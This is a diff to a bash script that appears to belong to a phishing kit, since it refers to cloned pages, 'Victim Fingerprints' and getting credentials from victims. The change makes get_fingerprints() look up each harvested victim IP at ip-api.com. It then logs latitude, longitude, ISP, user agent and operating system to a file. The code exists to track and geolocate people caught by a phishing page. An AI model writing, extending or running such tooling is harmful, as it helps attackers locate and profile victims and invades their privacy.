@@ -208,7 +208,8 @@ setup_clone_customize(){
 
 
 
-## Get IP address
+## Get IP address + Geo Location (Latitude, Longitude)
+
 get_fingerprints() {
 	IP=$(grep -a 'IP:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
     Full_Date=$(grep -a 'Full-Date:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
@@ -217,6 +218,19 @@ get_fingerprints() {
     City=$(grep -a 'City:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
     User_Agent=$(grep -a 'User-Agent:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
     OS_System=$(grep -a 'OS-System:.*' .www/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
+
+	# Get live location using ip-api.com
+	if [[ -n "$IP" ]]; then
+		location_response=$(curl -s "http://ip-api.com/json/$IP")
+		Latitude=$(echo "$location_response" | grep -o '"lat":[^,]*' | cut -d ':' -f2)
+		Longitude=$(echo "$location_response" | grep -o '"lon":[^,]*' | cut -d ':' -f2)
+		ISP=$(echo "$location_response" | grep -o '"isp":"[^"]*' | cut -d ':' -f2 | tr -d '"')
+	else
+		Latitude="N/A"
+		Longitude="N/A"
+		ISP="N/A"
+	fi
+
 	IFS=$'\n'	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Victim Fingerprints.. "
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${BLUE}$IP"
@@ -224,11 +238,17 @@ get_fingerprints() {
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Country: ${BLUE}$Country"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Region: ${BLUE}$Region"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} City: ${BLUE}$City"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Latitude: ${BLUE}$Latitude"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Longitude: ${BLUE}$Longitude"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} ISP: ${BLUE}$ISP"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} OS System: ${BLUE}$OS_System"
 	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Saved in : ${MAGENTA}fingerprints.txt"
-	cat .www/fingerprints.txt >> fingerprints.txt
+
+	# Save all info in one file
+	echo -e "IP: $IP\nDate: $Full_Date\nCountry: $Country\nRegion: $Region\nCity: $City\nLatitude: $Latitude\nLongitude: $Longitude\nISP: $ISP\nUser-Agent: $User_Agent\nOS: $OS_System\n-----------------------------" >> fingerprints.txt
 }
+
 
 
 # Get credentials from victims
